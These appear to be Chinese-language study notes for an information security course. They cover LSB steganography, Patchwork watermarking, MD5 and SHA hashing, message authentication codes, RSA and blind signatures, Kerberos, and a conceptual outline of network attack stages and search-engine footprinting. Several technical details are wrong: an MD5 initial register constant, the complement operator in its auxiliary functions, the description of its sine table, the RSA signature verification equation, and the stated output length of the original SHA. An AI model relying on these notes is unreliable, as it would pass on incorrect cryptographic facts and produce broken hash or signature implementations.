若$K_1 = K_2$则称为单密钥（对称密钥）信息隐藏系统，需要解决密钥传递问题，通常利用安全信道进行密钥交换。

若$K_1 \neq K_2$则称为公钥（非对称密钥）信息隐藏系统。

由于公钥的计算效率较低，通常与单钥信息隐藏系统混合使用：

* 用公钥加密并隐藏一个会话密钥。
* 用被隐藏的会话密钥加密并隐藏真正的秘密信息。

![](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/131133.png)

### 3.1.4 信息隐藏的载体

所有的媒体类型都可以成为载体对象，包括：**图像，视频，音频，文本，软件，协议**

### 3.1.5 信息隐藏技术衡量指标

* **不可感知性**：载体对象中隐藏机密信息后，不被人类的视觉或听觉等感官器官所察觉或怀疑。
* **不可检测性**：隐藏信息不仅需要让人无法察觉，还需要让检测软件无法检测到。
* **鲁棒性**：稳健性，指伪装对象在遭受无意或有意的处理后，隐藏信息仍能保持完整性或者仍能被准确识别的能力。
* **信息嵌入率**：嵌入的隐藏信息容量与载体对象本身信息容量的比率。信息嵌入率越高，说明信息隐藏算法的嵌入容量越大。高嵌入率容易导致不可感知性、不可检测性和鲁棒性的降低。
* **算法效率**：单位时间内嵌入的比特数。在实时性较高的场合，秘密信息的隐藏和提取速度尤为重要。

### 3.1.6 信息隐藏的应用领域

* **数据保密**：隐藏信息的传递。

  应用于政治、军事、经济等众多领域，如电子商务中的敏感数据，谈判双方的秘密协议，各种交易中的秘密数据、个人隐私、数字签名等。

* **防抵赖**：不可抵赖发出或接收的数据。

  参与交易的各方在发送或接收数据时均将个人特征标志加入传递的信息中，使各方无法否认发出或接受的信息。

* **版权保护**：数字作品的版权保护。

  在数据作品中加入出品方、销售方和购买方的特征信息，用于版权保护、盗版溯源追踪。

* **防伪造**：数据防伪造。

  在发票等电子票据中隐藏水印，在使用这些电子票据时可以通过提取水印确认票据的真假。

* **防篡改**：数据完整性保护。

  在信息中加入脆弱性水印，任意程度的数据修改均会导致水印破坏，从而可用于确认数据是否被篡改。

## 3.2 空域隐写技术

> 根据隐写对象的空间结构和工作域的不同，信息隐藏技术主要可分为**空域隐写和频域隐写**两种类型。

**空域隐写方法是一种在载体对象元素中加入秘密信息的方法**

* 只需对载体对象进行很小的、不易察觉的改变就能隐蔽很大的信息量，计算速度较快
* 隐藏的信息较为脆弱，若载体对象本身发声某些微小的改变，隐蔽信息就可能丢失
* LSB算法

**频(变)域隐写，是一种利用数学变换，将载体对象用变换域(或频域)表示，通过更改某些变换域系数来嵌入数据**

* 常用的数学方法：FFT、DCT、DWT
* 嵌入的秘密信息的信号能量可以分布到载体对象的所有元素中，对诸如压缩、修剪和某些图像处理等的攻击的鲁棒性更强

实现空域需要解决的三个问题：藏在哪？如何藏？如何对抗？

### 3.2.1 LSB算法（重点）

#### 1. LSB简介

> LSB全称为 Least Significant Bit（最低有效位），是一种常被用做图片隐写的算法（在CTF中经常见到她的身影）。LSB属于空域算法中的一种，是将信息嵌入到图像点中像素位的最低位，以保证嵌入的信息是不可见的，但是由于使用了图像不重要的像素位，算法的鲁棒性差，水印信息很容易为滤波、图像量化、几何变形的操作破坏。

#### 2. 算法分析

PNG和BMP图片中的图像像素一般是有由RGB三原色组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有$2^{24}$种色值。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类眼睛无法区分的颜色还有600多万。

当仅仅更改颜色分量的最低位时，人类的眼睛不能区分这前后的变化，LSB就是在该位置存放信息。

#### 3. 实现步骤

1. 将图像文件中的所有像素点以RGB形式分隔开，并将各个颜色分量转换成二进制表示。
2. 把每个颜色分量值的最后一位全部设置成0，对图像得影响非常细微，不会影响图像的显示格式。
3. 信息嵌入：将水印字符转化为二进制字符串，并将这些信息依次填入颜色分量的最低位上，即可完成信息的嵌入。
4. 信息提取：将图像像素的最低位依次提取出来，并进行拼接，即可得到原始信息。

#### 4. 扩展

**无调色板的彩色图像**

- 若无调色板时，每个像素的颜色由一个（R,G,B,A)元素对象决定，其中：
  - R、G、B为红、绿、蓝三原色的灰度值，各一个字节，取值为0-255
  - A为alpha值，一个字节，表示该像素的透明度

  ![image-20220508210611304](https://img.moxhub.cn/blog/image-20220508210611304.png)

  ![image-20220508210633236](https://img.moxhub.cn/blog/image-20220508210633236.png)

## 3.3 数字水印技术

### 3.3.1 数字水印概述

#### 1. 数字水印的定义

永久镶嵌在其他数据(载体)中具有可鉴别性的数字信号或模式，不影响载体数据的可用性，分为**可视水印和不可视水印**

#### 2. 与隐写的联系和区别

![](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/133823.png)

#### 3.  数字水印的组成

* **水印的形式**
  * 有意义的字符(版权所有者的地址，姓名等)
  * 伪随机序列（鲁棒性好）
  * 图像（手写签名，图标）
* **水印算法**(与隐写术类似，根据嵌入信息的空间结构，水印算法也同样可以分为空域算法和频域算法两种形式。)
  * 嵌入算法（嵌入效率，鲁棒性）
  * 检测算法（提取有意义的图片或字符，相关性判断）

#### 4. 数字水印应用领域

版权保护，广播监控，防止非法拷贝，数字指纹，内容验证，叛逆者追踪，元数据嵌入

### 3.3.2 Patchwork算法（重点）

#### 1. 图片预处理

载体图像 I 与水印图像 W 选取正方形的 RGB 图像，并满足载体图像的边长为 8 的倍数且载体图像边长为水印图像边长的 8 倍。将载体图像 I 的 3 个颜色通道分离，得到 IR、IG、IB 3 个颜色分量; 将水印图像W 的 3 个颜色通道分离，得到 WR、WG、WB 3 个颜色分量。

#### 2. 对水印Arnold置换

 对WR、WG、WB三个颜色分量进行Arnold变换，变换的过程可以看作是拉伸、压缩、折叠及拼接的过程，经过变换得到WRA、WGA、WBA。Arnold变换过程如下：
$$
\begin{pmatrix} xn+1 \\ yn+1 \end{pmatrix} = \begin{pmatrix} 1 & 1 \\ 1 & 2 \end{pmatrix} \begin{pmatrix} xn \\ yn \end{pmatrix} \ mod \ N
$$
其中$(x,y)$为图像上点坐标。

对载体图像进行DCT变换并提取直流分量。

载体图像的各分量以8×8的大小为一个单位划分为若干子块。将子块视为一个整体，最左上角的子块位置坐标为$(1,1)$，其相邻的右边的子块位置坐标为$(1，2) $，依此类推。对每一个子块分别应用DCT 变换，然后取出变换后的每一个子块左上角的直流分量组成一个新矩阵，位置坐标为$(1,1) $的子块的直流分量作为新矩阵$(1,1) $位置的元素，位置坐标为$ (1,2) $的子块的直流分量作为新矩阵$(1,2) $位置的元素，依此类推。最终所得的矩阵称为直流分量矩阵$IRD$、$IBD$、$IGD$。

#### 3. 在直流分量矩阵中嵌入水印

在直流分量矩阵上嵌入水印，嵌入方法是增加/减去置乱的水印图像分量k倍的亮度。分量提取公式如下：
$$
\cases{IRDE = IRD + k \times WRA \\ IGDE = IGD - k \times WGA \\ IBDE = IBD + k \times WBA}
$$
其中绿色分量在亮度处理时使用减操作，红色分量和蓝色分量使用加操作。由人类视觉系统的特性知这两个互逆的操作可以在一定程度上互相抵消嵌入信息引起的图像视觉上的变化，提高水印透明性。

#### 4. 合成嵌入水印图像

嵌入水印后的直流分量矩阵 IRDE、IBDE、IGDE按照对应位置替换各个子块的直流分量，再对各个子块分别应用反DCT 变换完成各颜色分量的水印嵌入。

最后将三个分量合成为水印图像。

#### 5. 水印的提取

预处理

将含有数字水印的载体图像 P 的 3 个颜色通道分离，得到PR、PG、PB 3 个颜色分量; 将原始载体图像 I 的 3 个颜色通道分离，得到IR、IG、IB 3 个颜色分量。

对含有水印的图像进行分块 DCT 变换并提取直流分量

对带水印载体图像P使用和水印嵌入时相同直流分量提取方式，得到PRD、PBD、PGD。

从直流分量矩阵中提取置乱的水印

提取方法如下：
$$
\cases{WRA = (PRD - IRD) \div k \\ WGA = (IGD - PGD) \div k \\ WBA = (PBD - IBD) \div k}
$$
将三个分量进行逆Arnold变换后组合成提取出的水印。

# 第4章 认证技术

## 4.1 为什么需要认证技术

在网络中，由于通信双方的相互不信任，以及可能存在的恶意行为，使得对传输数据的正确性、真实性，以及通信双方身份的真实性保证显得尤为重要。

> **伪装，内容修改，顺序修改，计时修改，发送方否认，接收方否认**等攻击行为威胁的不是机密性而是**完整**性，加密技术无法对抗，故需要认证技术来保证信息的正确。

## 4.2 认证技术简述

**认证（也称为鉴别，Authentication）的目的是确认通信中主体和客体的合法性、真实性。**

* 对主体而言，主要鉴别通信双方与其宣称的身份相符，没有冒充。包括对信源、信宿和地址等方面的鉴别。
* 对客体而言，主要鉴别发送和接收的消息的完整性，即消息在传输、存储过程中没有被篡改、伪造、重放等。

## 4.3 哈希函数（重中之重）

哈希函数是消息认证的基础，几乎所有常见的认证技术都建立在哈希函数的基础上。也可以简单的用哈希函数进行认证

### 4.3.1 哈希函数的基本概念

#### 4.3.2 哈希函数的定义

哈希（Hash，也称为散列、杂凑）函数，是一种能把任意长度的输入通过特定算法变换成固定长度输出的函数。其输出称为对于输入的哈希值、散列值、消息摘要或数字指纹。

#### 4.3.3 哈希函数的特点

对于Hash函数: $h = H(x)$

* 输出长度固定：无论输入数据多长，输出的长度固定
* 易计算：对于给定输入数据$x$,容易计算$h = H(x)$
* 单向性: 给定$h$，找到$x$使$h = H(x)$在计算上不可行

#### 4.3.4 哈希函数的构造方法

**普通构造方法**：直接寻址法；平方取中法；折叠法；随机数法；除留余数法

以上方法构造的哈希函数并不适合消息认证，可用于消息认证的哈希函数需要满足：

* 抗弱碰撞性(Weak Collision Resistence,WCR): 给定$x$，找到$y \neq x$使$H(x) = H(y)$在计算上不可行 ==(防范伪造)==
* 抗强碰撞性(Strong Collision Resistence,SCR): 找到任意的两个数据对$(x, y) y \neq x$,使$H(x) = H(y)$在计算上不可行 ==(防范已知生日攻击)==

**常用哈希函数构造方法**：

* **MD4**

  MD4（Message Digest，消息摘要） 是 MIT 的 Ronald L. Rivest 在1990年提出的一个单向哈希函数，对于不同的输入可产生一个128位的哈希值。基于32位操作数的位操作，适应32位字长。

* **MD5**

  MD5是Rivest 于1991年提出的对MD4的改进版本。MD5比MD4来得复杂，速度也较慢，但更安全，在抗分析和抗差分方面表现更好。

* **SHA**

  SHA（Secure Hash Algorithm）由NSA最早于1993年提出，是以MD4为基础的哈希算法。包括SHA、SHA-1、SHA-2和SHA-3等多个版本。其中，对于SHA版本，输出为128位；SHA-1则为160位；SHA-2则有多种输出长度，包括224位、256位、384位和512位等。

### 4.3.5 MD5算法（重点）

#### 1. MD5算法简介

MD5算法是一个循环压缩变换算法。以512位分组为单位，来处理输入的信息，每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后生成128位散列值。

![](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/100840.png)

> 上图中
>
> A、B、C、D为幻数（魔术数）
>
> F为非线性函数；
>
> Mi为32-bits的输入数据；
>
> Ki表示一个32-bits常数；
>
> <<<s表示循环左移s位

#### 2. 算法流程

##### step1. 进行数据填充整理

将输入信息填充到长度对$512$取余对于$448$。无论输入信息的长度多少，填充总是会发生的，即使本身的长度就已经满足模$512$对于$448$的情况下。

过程如下：

在输入信息后添加一个“$1$”，其余添加“$0$”使得输入信息长度对$512$取余等于448[$len(M) \pmod {512} = 448$]。总的来说，至少添加一位，至多添加$512$位。

![](https://ask.qcloudimg.com/http-save/yehe-1510914/mpd0sgit49.jpeg)

##### step2. 补充数据长度

将输入信息用$64$位表示并添加到填充的数据之后，如果输入信息大于$2^{64}$的话，则只取低$64$位。

##### step3. 初始化MD缓冲区

用一个四字缓冲区(A,B,C,D)来计算信息摘要，这里的A,B,C,D每一个都是表示一个$32$位的寄存器。这些寄存器的初始值如下(十六进制，低字节优先)

```c++
word A: 01 23 45 67
word B: 89 ab dc ed
word C: fe dc ba 98
word D: 76 54 32 10
```

##### step.4 处理消息

首先定义四个辅助函数。

```c++
F(X,Y,Z) = X & Y | (!X) & Z;
G(X,Y,Z) = X & Z | Y & (!Z);
H(X,Y,Z) = X ^ Y ^ Z;
I(X,Y,Z) = Y ^ (X | (!Z));
```

对于函数F来说，在每一位上F函数就像是一个选择器：`if X then Y else Z`。

这一步需要一个$64$长度的表格`T[1...64]`,由$sin$函数构造而成。T[i]是$4294967296$次运行`abs(sin(i))`的结果，以此类推即可。

我们需要进行以下处理

```c++
/* 处理原数据. */
For i = 0 to N/16-1 do
/* 将数据赋值给X. */
For j = 0 to 15 do
Set X[j] to M[i*16+j]
end /* 结束对j的循环 */
/* 把A保存位AA B保存为BB C保存为CC D保存位DD */
AA = A
BB = B
CC = C
DD = D
/* 第一轮操作 */
/* [abcd k s i] 表示如下操作
a = b + ((a + F(b,c,d) + X[k] + T[i]) <<< s). */
[ABCD 0 7 1] [DABC 1 12 2] [CDAB 2 17 3] [BCDA 3 22 4]
[ABCD 4 7 5] [DABC 5 12 6] [CDAB 6 17 7] [BCDA 7 22 8]
[ABCD 8 7 9] [DABC 9 12 10] [CDAB 10 17 11] [BCDA 11 22 12]
[ABCD 12 7 13] [DABC 13 12 14] [CDAB 14 17 15] [BCDA 15 22 16]
/* 第二轮操作 */
/* [abcd k s i] 表示如下操作
a = b + ((a + G(b,c,d) + X[k] + T[i]) <<< s). */
[ABCD 1 5 17] [DABC 6 9 18] [CDAB 11 14 19] [BCDA 0 20 20]
[ABCD 5 5 21] [DABC 10 9 22] [CDAB 15 14 23] [BCDA 4 20 24]
[ABCD 9 5 25] [DABC 14 9 26] [CDAB 3 14 27] [BCDA 8 20 28]
[ABCD 13 5 29] [DABC 2 9 30] [CDAB 7 14 31] [BCDA 12 20 32]
/* 第三轮操作 */
/* [abcd k s t] 表示如下操作
a = b + ((a + H(b,c,d) + X[k] + T[i]) <<< s). */
[ABCD 5 4 33] [DABC 8 11 34] [CDAB 11 16 35] [BCDA 14 23 36]
[ABCD 1 4 37] [DABC 4 11 38] [CDAB 7 16 39] [BCDA 10 23 40]
[ABCD 13 4 41] [DABC 0 11 42] [CDAB 3 16 43] [BCDA 6 23 44]
[ABCD 9 4 45] [DABC 12 11 46] [CDAB 15 16 47] [BCDA 2 23 48]
/* 第四轮操作 */
/* [abcd k s t] 表示如下操作
a = b + ((a + I(b,c,d) + X[k] + T[i]) <<< s). */
[ABCD 0 6 49] [DABC 7 10 50] [CDAB 14 15 51] [BCDA 5 21 52]
[ABCD 12 6 53] [DABC 3 10 54] [CDAB 10 15 55] [BCDA 1 21 56]
[ABCD 8 6 57] [DABC 15 10 58] [CDAB 6 15 59] [BCDA 13 21 60]
[ABCD 4 6 61] [DABC 11 10 62] [CDAB 2 15 63] [BCDA 9 21 64]
A = A + AA
B = B + BB
C = C + CC
D = D + DD
end /* 结束对i的循环 */
```

##### step.5 输出

上一步输出最终的结果A，B，C，D。我们从A的低位字节开，到D的高位字节结束，每一个都是32位，最终拼接的结果就是$4\times32 = 128$位，这就是MD5结算的结果。

### 4.3.6 SHA算法（重点）

#### 1. SHA算法简介

SHA(Secure Hash Algorithm)由NSA最早于1993年提出的安全哈希算法。SHA是一个算法家族，包括多个不同版本。

#### 2. SHA-1 过程

结构与MD5类似

1. 第一步：pading
   * 与MD5相同，补齐到512的倍数

2. 第二步
   * 分块

3. 第三步
   * 初始化MD buffer，160位常量(5个字) 
   * 进入循环，160输入+512输入$\rightarrow$160输出

4. 第四步
   * 最后的输出为SHA-1的结果

#### 3. SHA-1的结论

* 抵抗生日攻击: 160位hash值

* 没有发现两个不同的512-bit块,产生相同的“hash”

* 速度慢于MD5

* 安全性优于MD5

### 4.3.7 哈希函数的主要应用领域

**消息认证；数字签名；口令安全；客体(文件)完整性；密码协议研究与应用**

## 4.4 消息认证技术

### 4.4.1 基本概念

消息认证也称为报文认证（或鉴别），是对接收到的消息进行完整性鉴别。包括：

* 对收到的消息进行认证，验证其确实来自声称的发送方，并且在传输过程中没有被修改过
* 在消息中加入时间及顺序信息，实现对时间和顺序的认证
* 利用数字签名技术，抵抗发送方和接收方的否认攻击

### 4.4.2 主要的消息认证方法

主要的消息认证方法包括以下三种：

1. **消息加密**：以消息整体为对象进行加密，并以加密后的密文作为认证标识
   * 接收方必须能够识别出所接收消息及信息源的真实性、合法性和正确性
   * 防范收发双方否认发送或接收消息的能力弱
2. **消息认证码**：一个公开函数，加上一个密钥产生一个固定长度的值并以此作为认证标识
3. **散列函数**：一个公开函数，能够将任意长度的消息映射到一个固定长度的散列值，以此作为认证标识

### 4.4.3 消息认证码

消息认证码(Message Authentication Code)，或密码校验和(cryptographic checksum)，使用一个双方共享的秘密密钥生成一个固定大小的小数据块，称为$MAC$，并加入到消息中。

#### 1. MAC函数

若用户A和用户B共享密钥$K$，对于消息$M$，有$MAC = C_K(M)$

如果接收方计算的$MAC$与收到的$MAC$匹配，则：

* 接收者可以确信消息$M$未被改变

* 接收者可以确信消息来自所声称的发送者

* 如果消息中含有序列号，则可以保证正确的消息顺序

$MAC$函数类似于加密函数，但不需要可逆性。因此在数学上比加密算法被攻击的弱点要少。

#### 2. MAC的需求

条件：攻击者知道$MAC$函数但不知道密钥$K$

要求：

1. 已知$M$和$C_k(M)$，要想构造$M'$使得$C_k(M) = C_k(M')$在计算上不可行(计算上无碰撞)
2. $C_k(M)$均匀分布：随机选择$M$和$M'$，$Pr[C_K(M) = C_K(M')] = 2^{-|MAC|}$
3. $f$是$M$的一个变换(例如对某些位取反),那么, $Pr[C_K(M) = C_K(f(M))] = 2^{-|MAC|}$

### 4.4.4基于哈希函数的消息认证

利用哈希函数，也可以完成消息认证的工作。

* **MAC需要对全部数据进行加密**

  MAC速度慢

* **Hash是一种直接产生认证码的方法**

  没有密钥

  消息中任何一位的改变会导致Hash码的改变

* **Hash函数: h=H(x), 要求:**

  散列算法公开

  不同的报文不能产生相同的散列码

  H(x)能够快速计算

  对于任意报文无法预知它的散列码

  无法根据散列码倒推报文

  可作用于任何尺寸数据且均产生定长输出

## 4.5 数字签名技术

### 4.5.1 为什么需要数字签名技术

Bob可以伪造一条消息并称该消息发自Alice

​	**使用Bob和Alice共享的密钥产生认证码，并附于消息之后**

Alice可以否认曾发送某条消息

​	**因为Bob可以伪造，所以无法证明Alice确实发送过消息**

最吸引人的解决方案是数字签名

当通信双方发生了下列情况时，数字签名必须能够解决引发的争端：

* **否认**：发送方不承认自己发送过某一报文。

* **伪造**：接收方自己伪造一份报文，并声称它来自发送方。

* **冒充**：网络上的某个用户冒充另一个用户接收或发送报文。

* **篡改**：接收方对收到的信息进行篡改，或信息在传输过程中被第三方截获并篡改

### 4.5.2 数字签名的基本概念

数字签名在信息安全领域，包括身份认证、数据完整性、不可否认性和匿名性等方面有极为重要的应用。特别是在广域网络通信中涉及到的密钥分配和管理、认证和电子商务等领域，数字签名更是极为重要的工具。

#### 1. 数字签名定义

数字签名（digital signature）是附加在数据对象上的一些数据，或是对数据单元所作的密码变换。数字签名是用数学或密码技术对被签名对象的关键信息的提取和加密而得到，用于标识签名者的身份和对所签名对象的认可，并能够被接收者用于验证被签名对象的真实性和准确性。

#### 2. 数字签名原理

数字签名的基础是非对称加密技术和报文摘要技术（哈希）

数字签名的原理可归结为：

* **唯一性**：非对称密钥体制中私钥只有密钥发布者拥有，其他均不可能拥有；报文摘要也同样唯一，即一个报文只会得到唯一的摘要。

* **敏感性**：报文的任何修改，其摘要均会出现变化。

* **快速性**：报文摘要的获得具有较快的速度，可以满足对实时性要求较高的场合。

#### 3. 数字签名的特性

* **可信**：任何人都可以方便的验证签名的有效性。

* **不可伪造**：除合法的签名者外，任何其他人伪造其签名是困难的，在计算上是不可行的。

* **不可复制**：不能复制一个消息的签名用于另一个消息，任何人都可以容易的发现复制签名与消息之间的不一致。同一消息的不同时刻签名也不同。

* **不可变**：被签名的消息不可修改（合法或非法）。一旦修改，任何人都可以发现消息与签名之间的不一致。

* **不可抵赖**：签名者不可否认自己的签名。

#### 4. 数字签名与手写签名的不同

* **签名**：手写签名是被签名客体的物理组成部分，数字签名则是连接被签名客体的数字串。

* **传输**：数字签名和被签名客体可以在通信网络中传输，手写签名及被签名客体需要传统安全通道传输。

* **验证**：手写签名通过相似性比对，数字签名则通过公开的验证算法。

* **复制**：在与被签客体一起被复制时，数字签名依然有效，而手写签名的复制通常无效。

### 4.5.3 数字签名的实现方法（重点）

#### 1. 基于非对称加密技术的数字签名方法

* 在非对称加密体系中，私钥本身就能代表某个人的身份。利用私钥对发送的信息加密后就代表了唯一拥有该私钥的用户对所发送信息的认可。
* 非对称加密技术对计算能力要求过高，此类方法不适合绝大部分场合。

#### 2. 基于对称加密技术和哈希函数的数字签名方法

* 发送方用哈希函数计算发送信息的摘要，再用双方共享的对称密钥对报文摘要（或报文信息或二者）进行加密，接收方用共享对称密钥解密，计算报文摘要并验证。
* 对计算能力要求不高，在安全要求不高的场合有广泛应用。
* 因为密钥双方共享，因此可以伪造签名。

#### 3. 基于非对称加密和哈希函数的数字签名方法

* 发送方用哈希函数计算发送信息的摘要，再用自己的私钥对对报文摘要加密，接收方用发送方的公开密钥解密，计算报文摘要并验证。
* 对计算能力要求不高，安全能力较高，有广泛应用。
* 若公钥通过CA（Certificate Authority）颁发，安全程度更高。

### 4.5.4 常用的数字签名体制

在以非对称密码技术为基础的数字签名中最常见的签名体制：**RSA签名体制**和**DSS签名体制**

#### 1.RSA数字签名体制

**签名算法**

* 用一个安全的哈希函数$h$,对消息$m$计算报文摘要$h(m)$
* 计算签名$s = Sig_k(m) = h(m)^d \ mod \ n$

**验证算法**

* 用一个安全的哈希函数$h$,对消息$m$计算报文摘要$h(m)$
* 验证签名:判断等式$h(m)^d \ mod \ n = s^e \ mod \ n$是否成立。成立，签名有效；否则，签名无效。

![](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/112602.png)

### 4.5.5 盲签名（看一下）

在有些应用领域中，需要让签名者签名但又不能让签名者知道所签名消息的具体内容，这样的签名称为盲签名（Blind Signature）。

如在无记名投票选举、数字货币等领域中往往需要这样的签名。

> 盲签名的实现需要盲变换

#### 1. 盲签名的特性

盲签名与一般数字签名不同。一般数字签名思想是产生一串仅发送者能够产生的别人无法伪造的数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。盲签名的签名者是不知道其所签名消息的具体内容，仅在未来某一时刻（以公证人的身份）证明签名的真实性。

除了一般签名的特性外，盲签名还具备以下性质：

* 签名者对其签名的消息是不可见的（这就是“盲”的含义），即签名者不知道他所签名消息的具体内容。
* 签名消息不可追踪，即当签名消息被公布后，签名者无法知道这是他何时/哪次的签署的。

#### 2. 盲签名流程

1. 接收者首先将待签数据进行盲变换，把变换后的盲数据发给签名者。
2. 经签名者签名后再发给接收者。
3. 接收者对签名再作去盲变换，得出的便是签名者对原数据的盲签名。

#### 3. 盲签名的RSA方案

RSA 方案大致过程如下：

* **加密**:$C \equiv m^e \ mod \ n$

* **解密**:$m \equiv c^d \ mod \ n$

在盲签名中，签名者不能事先知道消息，所以RSA盲签名方案做了一个盲变换，将消息$m$转化为$m’$。为此，需要一个参数$r$，$gcd(r, N) = 1$

* 盲化消息：$m’= m r^e \ mod \ n$

* 签名消息：$s' = (m')^d\ mod\ n$
* 除盲消息：$s = s' r^{-1} \ mod \ n$

## 4.6 身份认证方法

### 4.6.1 概念

身份认证是计算机系统的用户在进入系统或访问不同保护级别的系统资源时，系统确认该用户的身份是否真实、合法和唯一。

### 4.6.2 方法及特点

* **基于口令的身份认证**

  最常见，最原始，但也最不安全

  容易由于外部泄漏等原因或通过口令猜测、线路窃听、重放攻击等手段导致合法用户身份被伪造

* **基于密钥的身份认证**

  信息的真实性保护

* **Kerberos认证系统**

  每次通信过程都有三个通信参与方：通信双方和一个双方都信任的第三方KDC.将发起认证服务的一方称为客户端，客户端需要访问的对象称为服务器端。
  Kerberos的安全性依赖于KDC。
  在Kerberos中,客户端是通过向服务器端提交自己的“凭据" ( Ticket )来证明自己的身份，该凭据是由KDC专门为客户端和服务器端在某一阶段内通信而生成的。

# 第5章 网络攻击技术

## 5.1 黑客及黑客文化

### 5.1.1 黑客及黑客文化概述

#### 1、黑客定义

自己大概写吧

#### 2、黑客分类

![](https://pic.imgdb.cn/item/62772a040947543129fba22e.png)

### 5.1.2 黑客网络攻击的一般过程（重点）

#### 1、网络攻击阶段

![](https://pic.imgdb.cn/item/62772dae094754312903e07d.jpg)

- **资料收集**：寻找目标网络及主机的IP地址与名称，搜集尽可能多的详细信息。

- **弱点扫描**：辨别目标网络或主机所开放和提供的服务，操作系统版本等。

- **弱点刺探**：根据目标提供的服务寻找安全突破点。如服务软件漏洞，操作系统漏洞，甚至是病毒留下来的后门等。

- **取得初步权限**：利用相关漏洞或者获得的用户名和口令取得进入系统的初步权限。

- **提升权限**：如果之前获得的权限不够，则在已有权限基础上，继续寻找其他办法提升权限。

- **进行破坏**：根据入侵目的对目标进行相关操作，或者继续对网络内其他目标进行渗透和攻击。

- **建立后门**：完成相关任务之后，种植木马或者克隆账号以便以后继续对其进行控制。

- **毁灭证据**：为了避免被人发现和追踪，清除或者伪造相关入侵证据。

- **瘫痪目标**：如果无法进入目标系统和网络，可以采用拒绝服务攻击使得目标网络瘫痪。

#### 2、网络攻击流程

![](https://pic.imgdb.cn/item/62772de60947543129045379.jpg)

#### 3、黑客常用的网络攻击技术

- **入侵系统**

  通过猜测或其他方法获得合法用户的账号和密码，以登录系统。

  在大部分情况下，登录系统后，为达到窃取信息或破坏系统的目的，需要提升权限。

- **欺骗技术**

  通过技术或非技术的手段，欺骗目标系统，实现窃取信息的目的

- **会话劫持**

  会话劫持（Session Hijack）是指迫使使一个在线的用户下线，接管并冒充这个用户与对方通信，从而达到自己的目的。

- **拒绝服务**

  拒绝服务（Denial of Service）是指通过某些手段使得目标系统或者网络不能提供正常的服务。

- **缓冲区溢出**

  缓冲区溢出（Buffer Overflow）是指当目标操作系统收到了超过了其最大能接收的信息量的时候，将发生缓冲区溢出。

- **恶意程序**

  也称为恶意代码，通常包括传统的计算机病毒、蠕虫病毒和特洛伊木马等多种人为制造的带有攻击意图的程序。能够潜伏或寄生在目标系统中，当某种条件成熟时，即可或自我复制、或进行传播，同时也可以破坏计算机系统及其资源。

## 5.2 信息收集技术

### 5.2.1 信息收集技术概述

#### 1、收集信息的目的

- **对于攻击者**：要拥有和保持先发优势，必须要搜集攻击目标的详细信息。

- **对于防御者**：要具备后发制人能力，必须搜集攻击者的详细信息，归因溯源。

#### 2、搜集的范围和内容

- **网络攻击需要搜集的信息**

  - 攻击对象：目标的名称和域名

  - 目标网络位置：IP地址、DNS服务器、外部网络拓扑结构
  - 真实世界中的对应物：注册信息、电话号段、网络或安全管理员及联系方式、地理位置等，以便开展实施社工和物理攻击
  - 网络地图：活跃主机IP、操作系统类型、开放的端口与运行的网络服务类型，以及存在的安全漏洞
  - 更加的详细信息：包括用户帐号、共享资源、网络服务配置、内部拓扑、外部网络连接方式和链路、防火墙的端口过滤与访问控制配置情况、身份认证与访问控制机制、加密机制等等

- **网络防御需要搜集的信息**

  - 攻击者身份、网络位置、地理位置、被攻击的目标、利用的漏洞、攻击方法、造成的损失等

  - 一般被归入取证与追踪技术范畴

- **网络信息收集的技术方法**

  ![](https://pic.imgdb.cn/item/62772f8a09475431290831f5.jpg)

### 5.2.2 网络踩点技术

#### 1、什么是网络踩点

踩点（footprinting）是指通过合法或非法的手段，有计划有步骤的信息情报搜集，从而了解目标网络的环境和安全防御设施的状况，得到目标网络的剖析图。

**踩点的目的可以归纳为**：

- 获得目标网络的完整剖析图
- 寻找到目标网络中可能存在的薄弱环节
- 为进一步的攻击行动提供指引

#### 2、踩点收集信息的内容

![](https://pic.imgdb.cn/item/62772fed0947543129092de1.jpg)

#### 3、WEB信息搜索与挖掘技术

##### **（1）公开渠道中收集信息**

- 目标Web网页、地理位置、相关组织


- 组织结构和人员、个人资料、电话、电子邮件


- 网络配置、安全防护机制的策略和技术细节

##### **（2）搜索与挖掘技术**

利用搜索引擎对目标进行字或词的搜索，发现有价值的信息。

- 保持简单。简单明了的关键词更利于搜索。


- 使用最可能出现在要查找的网页上的字词。


- 尽量简明扼要地描述要查找的内容。


- 选择独特性的描述字词。


- 善于利用搜索词智能提示功能。

**常用的高级搜索指令（重中之重）**

- **双引号（一定考**）：把搜索词放在双引号中，代表完全匹配搜索，即搜索结果包含双引号中出现的所有的词。
- **减号（一定考）**：搜索不包含减号后面的词的页面。使用这个指令时减号前面必须是空格，减号后面没有空格，紧跟着需要排除的词。
- **加号**：搜索包含加号后面的词的页面。使用这个指令时加号前面必须是空格，加号后面没有空格，紧跟着需要搜索的词。
- **inurl**: 用于搜索在url中包含查询词的页面，支持中文和英文。如：inurl:搜索引擎，返回结果都是url中包含“搜索引擎”的页面。
- **intitle**: 用于搜索在title中包含查询词的页面。Google 和百度都支持intitle 。通常情况下，intitle找的页面更有价值。
- **intext**: 用于搜索正文里边包含了查询词的网页。
- **filetype**：用于搜索指导的文件格式。如 filetype:pdf SEO，返回包含 关键词SEO的所有pdf文件。
- **site**：可以将搜索限度在某个域名下，以保证搜索的精准性。如：在谷歌搜索中输入：`admissions site:www.mit.edu`，在将在麻省理工学院的域名下搜索所有包含admissions的页面。

##### **（3）信息搜索与挖掘防范措施**

- 注意组织安全敏感信息以及个人隐私信息不要在因特网上随意发布
- 个人上网时尽量保持匿名 

  - 网络实名制
- 必须提供个人隐私信息时，应选择具有良好声誉并可信任的网站
- 定期对自身单位及个人在Web上的信息足迹进行搜索

  - 掌握Google Hacking信息搜索技术
  - 发现存在非预期泄漏的敏感信息后，应采取行动进行清除

#### 4、DNS与IP查询

##### **（1）DNS/IP是互联网的基础设施**

- **DNS/IP**
  - 因特网赖以运转的两套基础设施环境

  - 因特网上的公共数据库中进行维护

  - 层次化结构管理

- **ICANN:**因特网技术协调机
- **ASO：**地址支持组织，负责IP地址分配和管理
  
